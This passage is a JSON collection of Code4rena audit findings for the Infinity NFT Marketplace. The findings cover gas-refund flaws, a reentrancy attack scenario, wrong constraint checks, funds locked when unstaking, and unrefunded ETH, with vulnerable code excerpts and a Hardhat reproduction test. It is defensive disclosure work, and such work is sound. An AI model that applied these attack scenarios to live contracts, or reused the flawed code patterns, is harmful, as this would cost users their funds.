        "BowTiedWardens",
        "cccz",
        "joestakey",
        "Ruhum",
        "throttle",
        "WatchPug",
        "berndartmueller",
        "shenwilly",
        "peritoflores",
        "m9800",
        "defsec"
      ]
    },
    {
      "id": "2779",
      "title": "[M-02] Maker order buyer is forced to reimburse the gas cost at any `tx.gasprice`",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug, also found by 0xsanson, and shenwilly_\n\n```solidity\nuint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n// if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n// else we need to send the protocol fee separately in the execution currency\nif (buy.execParams[1] == weth) {\n  IERC20(weth).safeTransferFrom(buy.signer, address(this), protocolFee + gasCost);\n} else {\n  IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, address(this), protocolFee);\n  IERC20(weth).safeTransferFrom(buy.signer, address(this), gasCost);\n}\n```\n\nIn the current design/implementation, while the order is executed by the `MATCH_EXECUTOR`, the gas cost will always be paid by the maker order's buyer.\n\nWhile the buyer did agreed to pay a certain price for certain NFTs, the actual cost for that maker buy order is unpredictable: because the `MATCH_EXECUTOR` can choose to execute the order while the network is extremly busy and the gas price is skyhigh.\n\nAs the gas cost at whatever gas price will be reimbursed by the buyer, the executor has no incentive to optimize and choose to execute the order at a lower gas cost.\n\nThe result is the buyer can sometimes end up paying much higher total price (incl. gas cost) for the items they bought.\n\n### Impact\n\nWhile this is more of a design issue than a wrong implementation, the impact can be very severe for some users, and can cause defacto fund loss to the users who have they maker buy orders matched at a high gas price transactions.\n\n### Recommendation\n\nConsider adding a new paramer to maker buy orders, `maxGasCost` to allow the buyer to limit the max gas they agreed to pay.\n\n**[nneverlander (Infinity) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/257#issuecomment-1160618955):**\n> We have considered this issue and decided to handle it offchain. The offchain matching engine does not send txns if gas costs are high by default. While this involves some trust, we wanted to simplify the UX for users. \n> \n> In any case, it is trivial for us to add the max gas preference setting offchain on the UI and the matching engine will respect that. \n> \n> We can consider adding this preference to the orderType itself in a future implementation.\n> \n> As such, the bug can be classified as low risk but I leave it up to more experienced judges.\n> \n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/257#issuecomment-1179578358):**\n> Thank you for the detailed response here @nneverlander!\n> \n> Due to the gas refund logic highlighted by the warden here, users could end up spending their entire balance (or amount approved) unexpectedly. I understand that this could be handled with off chain logic but a bug in that system could have significant impact on users. Since it is just a single trusted actor that could cause damage here - I believe this is a Medium risk issue due to the \"external requirements\" such as a bug in the off chain matcher.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code for the Infinity Exchange smart contract. The code allows for the gas cost of an order to be paid by the buyer of the order, regardless of the gas price. This means that the buyer can end up paying more than they agreed to for the order due to high gas prices. This can lead to significant losses for the buyer. The recommendation is to add a parameter to the maker buy order, maxGasCost, to allow the buyer to limit the max gas they are willing to pay.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/257",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "WatchPug",
        "shenwilly",
        "0xsanson"
      ]
    },
    {
      "id": "2778",
      "title": "[M-01] InfinityExchange computes gas refunds in a way where the first order's buyer pays less than the later ones",
      "impact": "MEDIUM",
      "content": "_Submitted by Ruhum, also found by 0xf15ers, 0xsanson, antonttc, kenzo, and WatchPug_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L149>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L202>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L273>\n\n### Impact\n\nThe way the gas refunds are computed in the InfinityExchange contract, the first orders pay less than the latter ones. This causes a loss of funds for the buyers whose orders came last in the batch.\n\n### Proof of Concept\n\nThe issue is that the `startGasPerOrder` variable is computed within the for-loop. That causes the first iterations to be lower than later ones.\n\nHere's an example for the following line: <https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L202>\nTo make the math easy we use the following values:\n\n    startGas = 1,000,000\n    gasPerOrder = 100,000 (so fulfilling an order costs us 100,000 gas)\n    ordersLength = 10\n\nFor the 2nd order we then get:\n\n    startGasPerOrder = 900,000 + ((1,000,000 + 20,000 - 900,000) / 10)\n    startGasPerOrder = 912,000\n\nFor the 9th order we get:\n\n    startGasPerOrder = 200,000 + ((1,000,000 + 20,000 - 200,000) / 10)\n    startGasPerOrder = 282,000\n\nThe `startGasPerOrder` variable is passed through a couple of functions without any modification until it reaches a line like this: <https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L231>\n\n```sol\nuint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n```\n\nThere, the actual gas costs for the user are computed.\n\nIn our case, that would be:\n\n    # 2nd order\n    # gasleft() is 800,00 because we said that executing the order costs ~100,000 gas. At the beginning of the order, it was 900,000 so now it's 800,000. This makes the computation a little more straightforward although it's not 100% correct.\n    gasCost = (912,000 - 800,000 + 50,000) * 1\n    gasCost = 162,000\n\n    # 9th order\n    gasCost = (282,000 - 100,000 + 50,000) * 1\n    gasCost = 232,000\n\nSo the 2nd order's buyer pays `162,000` while the 9th order's buyer pays `232,000`.\n\nAs I said the math was dumbed down a bit to make it easier. The actual difference might not be as big as shown here. But, there is a difference.\n\n### Recommended Mitigation Steps\n\nThe `startGasPerOrder` variable should be initialized *outside* the for-loop.\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/82#issuecomment-1162872661):**\n > Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/5a3f81b82a9bee2de7517b3a5f18953cb5ec3684\n> \n> Agree with risk assessment.\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/82#issuecomment-1179582713):**\n > When multiple orders are processed in batch, some users pay more than their expected share of gas costs.\n> \n> Although the impact may be relatively small values, this appears to be a common path and would result in taking more value than expected from many users during normal usage. Rating this a Medium risk issue as it leaks value impacting users who are not first in a batch transaction.\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the InfinityExchange contract, in which the first orders pay less than the latter ones, causing a loss of funds for the buyers whose orders came last in the batch. This is due to the way the gas refunds are computed in the contract, as the `startGasPerOrder` variable is computed within the for-loop. To illustrate this, an example is given using the following values: startGas = 1,000,000, gasPerOrder = 100,000, and ordersLength = 10. For the 2nd order, the startGasPerOrder is 912,000 while for the 9th order, it is 282,000. This results in the 2nd order's buyer paying 162,000 while the 9th order's buyer pays 232,000. The recommended mitigation step for this issue is to initialize the `startGasPerOrder` variable outside the for-loop.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/82",
      "tags": [],
      "finders": [
        "0xsanson",
        "0xf15ers",
        "Ruhum",
        "WatchPug",
        "antonttc",
        "kenzo"
      ]
    },
    {
      "id": "2777",
      "title": "[H-11] Reentrancy from `matchOneToManyOrders`",
      "impact": "HIGH",
      "content": "_Submitted by kenzo, also found by 0xDjango_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L178>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L216>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L230>\n\n### Vulnerability Details\n\n`matchOneToManyOrders` doesn't conform to Checks-Effects-Interactions pattern, and updates the maker order nonce only after the NFTs and payment have been sent.\nUsing this, a malicious user can re-enter the contract and re-fulfill the order using `takeOrders`.\n\n### Impact\n\nOrders can be executed twice. User funds would be lost.\n\n### Proof of Concept\n\n`matchOneToManyOrders` will set the order nonce as used only after the tokens are being sent:\n\n      function matchOneToManyOrders(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.MakerOrder[] calldata manyMakerOrders) external {\n        ...\n        if (makerOrder.isSellOrder) {\n          for (uint256 i = 0; i < ordersLength; ) {\n            ...\n            _matchOneMakerSellToManyMakerBuys(...); // @audit will transfer tokens in here\n            ...\n          }\n          //@audit setting nonce to be used only here\n          isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n        } else {\n          for (uint256 i = 0; i < ordersLength; ) {\n            protocolFee += _matchOneMakerBuyToManyMakerSells(...); // @audit will transfer tokens in here\n            ...\n          }\n          //@audit setting nonce to be used only here\n          isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n          ...\n      }\n\nSo we can see that tokens are being transferred before nonce is being set to executed.\n\nTherefore, POC for an attack -\nAlice wants to buy 2 unspecified WolfNFT, and she will pay via AMP, an ERC-777 token.\nMalicious user Bob will set up an offer to sell 2 WolfNFT.\nThe MATCH_EXECUTOR will match the offers.\nBob will set up a contract such that upon receiving of AMP, it will call [`takeOrders`](https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L336) with Alice's order, and 2 other WolfNFTs.\n(Note that although `takeOrders` is `nonReentrant`, `matchOneToManyOrders` is not, and so the reentrancy will succeed.)\n\nSo in `takeOrders`, the contract will match Alice's order with Bob's NFTs, and then set Alice's order's nonce to true, then `matchOneToManyOrders` execution will resume, and again will set Alice's order's nonce to true.\n\nAlice ended up buying 4 WolfNFTs although she only signed an order for 2. Tough luck, Alice.\n\n(Note: a similar attack can be constructed via ERC721's onERC721Received.)\n\n### Recommended Mitigation Steps\n\nConform to CEI and set the nonce to true before executing external calls.\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/184#issuecomment-1162891402):**\n > Fixed in: https://github.com/infinitydotxyz/exchange-contracts-v2/commit/b90e746fa7af13037e7300b58df46457a026c1ac\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/184#issuecomment-1179805097):**\n > Great catch! Agree with the assessment.\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the 'matchOneToManyOrders' function of the 'InfinityExchange' smart contract. The issue is that the function does not conform to the Check-Effects-Interactions (CEI) pattern, and updates the maker order nonce only after the Non-Fungible Tokens (NFTs) and payment have been sent. This means that a malicious user can re-enter the contract and re-fulfill the order using 'takeOrders'. This can result in a user's funds being lost as orders can be executed twice. \n\nA proof of concept (POC) is provided which outlines a scenario where Alice wants to buy 2 unspecified WolfNFTs and pays via AMP, an ERC-777 token. Malicious user Bob sets up an offer to sell 2 WolfNFTs. The MATCH_EXECUTOR matches the offers, and Bob sets up a contract which calls 'takeOrders' with Alice's order and 2 other WolfNFTs. This is possible as 'matchOneToManyOrders' is not non-reentrant. As a result, Alice ends up buying 4 WolfNFTs instead of the 2 she signed up for.\n\nThe recommended mitigation step is to conform to CEI and set the nonce to true before executing external calls.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/184",
      "tags": [
        "Reentrancy"
      ],
      "finders": [
        "0xDjango",
        "kenzo"
      ]
    },
    {
      "id": "2776",
      "title": "[H-10] Sellers may lose NFTs when orders are matched with `matchOrders()`",
      "impact": "HIGH",
      "content": "_Submitted by KIntern, also found by csanuragjain, GimelSec, kenzo, and unforgiven_\n\nFunction `matchOrders` uses custom constraints to make the matching more flexible, allow seller/buyer to specify maximum/minimum number of NFTs they want to sell/buy. This function first does some checks and then execute matching.\n\nBut in [function](https://github.com/infinitydotxyz/exchange-contracts-v2/blob/c51b7e8af6f95cc0a3b5489369cbc7cee060434b/contracts/core/InfinityOrderBookComplication.sol#L192) `areNumItemsValid()`, there is a wrong checking will lead to wrong logic in `matchOrders()` function.\n\nInstead of checking if `numConstructedItems <= sell.constraints[0]` or not, function `areNumItemsValid()` check if `buy.constraints[0] <= sell.constraints[0]`. It will lead to the scenario that `numConstructedItems > sell.constraints[0]` and make the seller sell more number of nfts than he/she allow.\n\n### Proof of Concept\n\nConsider the scenario\n\n1.  Alice create a sell order to sell maximum 2 in her 3 BAYC with ids `[1, 2, 3]`\n2.  Bob create a buy order to buy mimimum any 2 BAYC with id in list `[1, 2, 3]`\n3.  Match executor call `matchOrders()` to match Alice's order and Bob's one with parameter `constructs = [1, 2, 3]`\n4.  Function `matchOrders` will transfer all NFT in `construct` list (3 NFTs `1, 2, 3`) from seller to buyer even though seller only want to sell maximum 2 NFTs.\n\nFor more information, please check this PoC.\n<https://gist.github.com/minhquanym/a95c8652de8431c5d1d24aa4076a1878>\n\n### Tools Used\n\nHardhat, Chai\n\n### Recommended Mitigation Steps\n\nReplace check `buy.constraints[0] <= sell.constraints[0]` with `numConstructedItems <= sell.constraints[0]`\n\n**[nneverlander (Infinity) confirmed](https://github.com/code-423n4/2022-06-infinity-findings/issues/164#issuecomment-1163505913)**\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/164#issuecomment-1179746706):**\n > Seller's may specify a max number of NFTs to sell, but in the scenario outlined by the warden that requirement is not enforced - leading to the sale of more NFTs than authorized.\n> \n> Accepting this as a High risk report.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the function `matchOrders` of the InfinityOrderBookComplication.sol contract. This function allows sellers and buyers to specify the maximum and minimum number of Non-Fungible Tokens (NFTs) they want to sell/buy. However, in the function `areNumItemsValid()` there is a wrong check which leads to wrong logic in the `matchOrders()` function. Instead of checking if `numConstructedItems <= sell.constraints[0]`, the function checks if `buy.constraints[0] <= sell.constraints[0]`. This can lead to the scenario where `numConstructedItems > sell.constraints[0]` and the seller is forced to sell more NFTs than they intended. \n\nTo illustrate this vulnerability, consider the scenario where Alice creates a sell order to sell maximum 2 of her 3 BAYC with ids `[1, 2, 3]` and Bob creates a buy order to buy any 2 BAYC with ids in the list `[1, 2, 3]`. When the `matchOrders()` function is called with the parameter `constructs = [1, 2, 3]`, all 3 NFTs `1, 2, 3` will be transferred from the seller to the buyer, even though the seller only wanted to sell a maximum of 2 NFTs. \n\nTo fix this vulnerability, the check `buy.constraints[0] <= sell.constraints[0]` should be replaced with `numConstructedItems <= sell.constraints[0]`. The tools used to test this vulnerability were Hardhat and Chai.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/164",
      "tags": [],
      "finders": [
        "csanuragjain",
        "KIntern",
        "unforgiven",
        "GimelSec",
        "kenzo"
      ]
    },
    {
      "id": "2775",
      "title": "[H-09] Calling `unstake()` can cause locked funds",
      "impact": "HIGH",
      "content": "_Submitted by Ruhum, also found by 0xDjango, auditor0517, dipp, GimelSec, GreyArt, p4st13r4, and wagmi_\n\nFollowing scenario:\n\nAlice has staked X token for 6 months that have vested. She stakes Y tokens for another three months. If she now calls `unstake(X)` to take out the tokens that have vested, the Y tokens she staked for three months will be locked up.\n\n### Proof of Concept\n\nFirst, here's a test showcasing the issue:\n\n```js\n  describe('should cause trouble', () => {\n    it('should lock up funds', async function () {\n      await approveERC20(signer1.address, token.address, amountStaked, signer1, infinityStaker.address);\n      await infinityStaker.connect(signer1).stake(amountStaked, 2);\n      await network.provider.send(\"evm_increaseTime\", [181 * DAY]);\n      await network.provider.send('evm_mine', []);\n      \n      // The funds we staked for 6 months have vested\n      expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);\n\n      // Now we want to stake funds for three months\n      await approveERC20(signer1.address, token.address, amountStaked2, signer1, infinityStaker.address);\n      await infinityStaker.connect(signer1).stake(amountStaked2, 1);\n\n      // total staked is now the funds staked for three & six months\n      // total vested stays the same\n      expect(await infinityStaker.getUserTotalStaked(signer1.address)).to.eq(amountStaked.add(amountStaked2));\n      expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);\n\n      // we unstake the funds that are already vested.\n      const userBalanceBefore = await token.balanceOf(signer1.address);\n      await infinityStaker.connect(signer1).unstake(amountStaked);\n      const userBalanceAfter = await token.balanceOf(signer1.address);\n\n      expect(userBalanceAfter).to.eq(userBalanceBefore.add(amountStaked));\n\n      expect(await infinityStaker.getUserTotalStaked(signer1.address)).to.eq(ethers.BigNumber.from(0));\n      expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(ethers.BigNumber.from(0));\n    });\n  });\n```\n\nThe test implements the scenario I've described above. In the end, the user got back their `amountStaked` tokens with the `amountStaked2` tokens being locked up in the contract. The user has no tokens staked at the end.\n\nThe issue is in the `_updateUserStakedAmounts()` function:\n\n```sol\n    if (amount > noVesting) {\n      userstakedAmounts[user][Duration.NONE].amount = 0;\n      userstakedAmounts[user][Duration.NONE].timestamp = 0;\n      amount = amount - noVesting;\n      if (amount > vestedThreeMonths) {\n        // MAIN ISSUE:\n        // here `vestedThreeMonths` is 0. The current staked tokens are set to `0` and `amount` is decreased by `0`.\n        // Since `vestedThreeMonths` is `0` we shouldn't decrease `userstakedAmounts` at all here.\n        userstakedAmounts[user][Duration.THREE_MONTHS].amount = 0;\n        userstakedAmounts[user][Duration.THREE_MONTHS].timestamp = 0;\n        amount = amount - vestedThreeMonths;\n        // `amount == vestedSixMonths` so we enter the else block\n        if (amount > vestedSixMonths) {\n          userstakedAmounts[user][Duration.SIX_MONTHS].amount = 0;\n          userstakedAmounts[user][Duration.SIX_MONTHS].timestamp = 0;\n          amount = amount - vestedSixMonths;\n          if (amount > vestedTwelveMonths) {\n            userstakedAmounts[user][Duration.TWELVE_MONTHS].amount = 0;\n            userstakedAmounts[user][Duration.TWELVE_MONTHS].timestamp = 0;\n          } else {\n            userstakedAmounts[user][Duration.TWELVE_MONTHS].amount -= amount;\n          }\n        } else {\n          // the staked amount is set to `0`.\n          userstakedAmounts[user][Duration.SIX_MONTHS].amount -= amount;\n        }\n      } else {\n        userstakedAmounts[user][Duration.THREE_MONTHS].amount -= amount;\n      }\n    } else {\n      userstakedAmounts[user][Duration.NONE].amount -= amount;\n    }\n```\n\n### Recommended Mitigation Steps\n\nDon't set `userstakedAmounts.amount` to `0` if none of its tokens are removed (`vestedAmount == 0`)\n\n**[nneverlander (Infinity) confirmed](https://github.com/code-423n4/2022-06-infinity-findings/issues/50#issuecomment-1163063584)**\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/50#issuecomment-1179743567):**\n > When unstaking, unvested tokens may become locked in the contract forever.\n> \n> Accepting this as a High risk issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in a smart contract code that can cause funds to be locked up. The vulnerability is present in the 'InfinityStaker.sol' contract and is located between lines 290 and 325. The issue is demonstrated in a test case, which showcases the scenario where Alice has staked X tokens for 6 months that have vested, and then stakes Y tokens for another 3 months. If she then calls 'unstake(X)' to take out the tokens that have vested, the Y tokens she staked for 3 months will be locked up. The issue is in the '_updateUserStakedAmounts()' function, where the current staked tokens are set to 0 and the amount is decreased by 0. This should not happen if the vested amount is 0. The recommended mitigation step is to not set 'userstakedAmounts.amount' to 0 if none of its tokens are removed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/50",
      "tags": [],
      "finders": [
        "GreyArt",
        "auditor0517",
        "0xDjango",
        "Ruhum",
        "dipp",
        "p4st13r4",
        "wagmi",
        "GimelSec"
      ]
    },
    {
      "id": "2774",
      "title": "[H-08] Overpayment of native ETH is not refunded to buyer",
      "impact": "HIGH",
      "content": "_Submitted by horsefacts, also found by 0x29A, antonttc, berndartmueller, byterocket, cccz, codexploder, dipp, GimelSec, GreyArt, Lambda, oyc_109, Ruhum, and unforgiven_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L119-L121>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232>\n\n### Vulnerability Details\n\n`InfinityExchange` accepts payments in native ETH, but does not return overpayments to the buyer. Overpayments are likely in the case of auction orders priced in native ETH.\n\nIn the case of a Dutch or reverse Dutch auction priced in native ETH, the end user is likely to send more ETH than the final calculated price in order to ensure their transaction succeeds, since price is a function of `block.timestamp`, and the user cannot predict the timestamp at which their transaction will be included.\n\nIn a Dutch auction, final price may decrease below the calculated price at the time the transaction is sent. In a reverse Dutch auction, the price may increase above the calculated price by the time a transaction is included, so the buyer is incentivized to provide additional ETH in case the price rises while their transaction is waiting for inclusion.\n\nThe `takeOrders` and `takeMultipleOneOrders` functions both check that the buyer has provided an ETH amount greater than or equal to the total price at the time of execution:\n\n[`InfinityExchange#takeOrders`](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363)\n\n```solidity\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n```\n\n[`InfinityExchange#takeMultipleOneOrders`](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327)\n\n```solidity\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n```\n\nHowever, neither of these functions refunds the user in the case of overpayment. Instead, overpayment amounts will accrue in the contract balance.\n\nMoreover, since there is a bug in `rescueETH` that prevents ether withdrawals from `InfinityExchange`, these overpayments will be locked permanently: the owner cannot withdraw and refund overpayments manually.\n\nScenario:\n\n*   Alice creates a sell order for her token with constraints that set up a reverse Dutch auction: start price `500`, end price `2000`, start time `1`, end time `5`.\n*   Bob fills the order at time `2`. The calculated price is `875`. Bob is unsure when his transaction will be included, so provides a full `2000` wei payment.\n*   Bob's transaction is included at time `3`. The calculated price is `1250`.\n*   Bob's additional `750` wei are locked in the contract and not refunded.\n\nSuggestion: Calculate and refund overpayment amounts to callers.\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/244#issuecomment-1160526998):**\n > Agree with the assessment, fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/a605b72e44256aee76d80ae1652e5c98c855ffd3\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/244#issuecomment-1179719920):**\n > In the case of a Dutch auction, precise pricing is unknown at the time a tx is broadcasted. This leads to users overpaying and the surplus is taken as exchange fees instead of being refunded.\n> \n> Accepting as a High risk submission.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the InfinityExchange smart contract, which accepts payments in native ETH but does not return overpayments to the buyer. Overpayments are likely to occur in the case of auction orders priced in native ETH, such as Dutch and reverse Dutch auctions. The functions `takeOrders` and `takeMultipleOneOrders` check that the buyer has provided an ETH amount greater than or equal to the total price at the time of execution, however, neither of these functions refunds the user in the case of overpayment. Instead, overpayment amounts will accrue in the contract balance, and due to a bug in `rescueETH`, these overpayments will be locked permanently. \n\nTo illustrate this, an example is given of Alice creating a sell order for her token with reverse Dutch auction constraints, and Bob filling the order at time `2` with a payment of `2000` wei. Bob's transaction is included at time `3` when the calculated price is `1250`, leaving an overpayment of `750` wei which is locked in the contract and not refunded. \n\nThe suggestion is to calculate and refund overpayment amounts to callers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/244",
      "tags": [],
      "finders": [
        "GreyArt",
        "codexploder",
        "cccz",
        "unforgiven_",
        "Ruhum",
        "berndartmueller",
        "Lambda",
        "antonttc",
        "byterocket",
        "dipp",
        "0x29A",
        "oyc109",
        "horsefacts",
        "GimelSec"
      ]
    },
    {
      "id": "2773",
      "title": "[H-07] `_transferNFTs()` succeeds even if no transfer is performed",
      "impact": "HIGH",
      "content": "_Submitted by k, also found by 0x29A, 0xf15ers, 0xsanson, antonttc, hyh, PwnedNoMore, and zzzitron_\n\nIf an NFT is sold that does not specify support for the ERC-721 or ERC-1155 standard interface, the sale will still succeed. In doing so, the seller will receive funds from the buyer, but the buyer will not receive any NFT from the seller. This could happen in the following cases:\n\n1.  A token that claims to be ERC-721/1155 compliant, but fails to implement the `supportsInterface()` function properly.\n2.  An NFT that follows a standard other than ERC-721/1155 and does not implement their EIP-165 interfaces.\n3.  A malicious contract that is deployed to take advantage of this behavior.\n\n### Proof of Concept\n\n<https://gist.github.com/kylriley/3bf0e03d79b3d62dd5a9224ca00c4cb9>\n\n### Recommended Mitigation Steps\n\nIf neither the ERC-721 nor the ERC-1155 interface is supported the function should revert. An alternative approach would be to attempt a `transferFrom` and check the balance before and after to ensure that it succeeded.\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/87#issuecomment-1162963184):**\n > Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/377c77f0888fea9ca1e087de701b5384a046f760\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/87#issuecomment-1179596601):**\n> If `supportsInterface` returns false for both 721 & 1155 then no NFT is transferred but funds are still sent to the seller.\n> \n> A number of NFTs do not fully comply with the 721/1155 standards. Since the order is not canceled or the tx reverted, this seems like a High risk issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the InfinityExchange.sol contract code on GitHub. If an NFT is sold that does not specify support for the ERC-721 or ERC-1155 standard interface, the sale will still succeed. This means that the seller will receive funds from the buyer, but the buyer will not receive any NFT from the seller. This vulnerability can occur in the following cases: 1. a token that claims to be ERC-721/1155 compliant, but fails to implement the `supportsInterface()` function properly; 2. an NFT that follows a standard other than ERC-721/1155 and does not implement their EIP-165 interfaces; and 3. a malicious contract that is deployed to take advantage of this behavior. A proof of concept is provided to demonstrate the vulnerability. The recommended mitigation steps are to either revert if neither the ERC-721 nor the ERC-1155 interface is supported, or to attempt a `transferFrom` and check the balance before and after to ensure that it succeeded.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/87",
      "tags": [
        "ERC721",
        "ERC1155"
      ],
      "finders": [
        "0xsanson",
        "0xf15ers",
        "k",
        "antonttc",
        "zzzitron",
        "0x29A",
        "hyh",
        "PwnedNoMore"
      ]
    },
    {
      "id": "2772",
      "title": "[H-06] Some real-world NFT tokens may support both ERC721 and ERC1155 standards, which may break `InfinityExchange::_transferNFTs`",
      "impact": "HIGH",
      "content": "_Submitted by PwnedNoMore_\n\nMany real-world NFT tokens may support both ERC721 and ERC1155 standards, which may break `InfinityExchange::_transferNFTs`, i.e., transferring less tokens than expected.\n\nFor example, the asset token of [The Sandbox Game](https://www.sandbox.game/en/), a Top20 ERC1155 token on [Etherscan](https://etherscan.io/tokens-nft1155?sort=7d\\&order=desc), supports both ERC1155 and ERC721 interfaces. Specifically, any ERC721 token transfer is regarded as an ERC1155 token transfer with only one item transferred ([token address](https://etherscan.io/token/0xa342f5d851e866e18ff98f351f2c6637f4478db5) and [implementation](https://etherscan.io/address/0x7fbf5c9af42a6d146dcc18762f515692cd5f853b#code#F2#L14)).\n\nAssuming there is a user tries to buy two tokens of Sandbox's ASSETs with the same token id, the actual transferring is carried by `InfinityExchange::_transferNFTs` which first checks ERC721 interface supports and then ERC1155.\n\n```solidity\n  function _transferNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {\n      _transferERC721s(from, to, item);\n    } else if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {\n      _transferERC1155s(from, to, item);\n    }\n  }\n```\n\nThe code will go into `_transferERC721s` instead of `_transferERC1155s`, since the Sandbox's ASSETs also support ERC721 interface. Then,\n\n```solidity\n  function _transferERC721s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numTokens = item.tokens.length;\n    for (uint256 i = 0; i < numTokens; ) {\n      IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n```\n\nSince the `ERC721(item.collection).safeTransferFrom` is treated as an ERC1155 transferring with one item 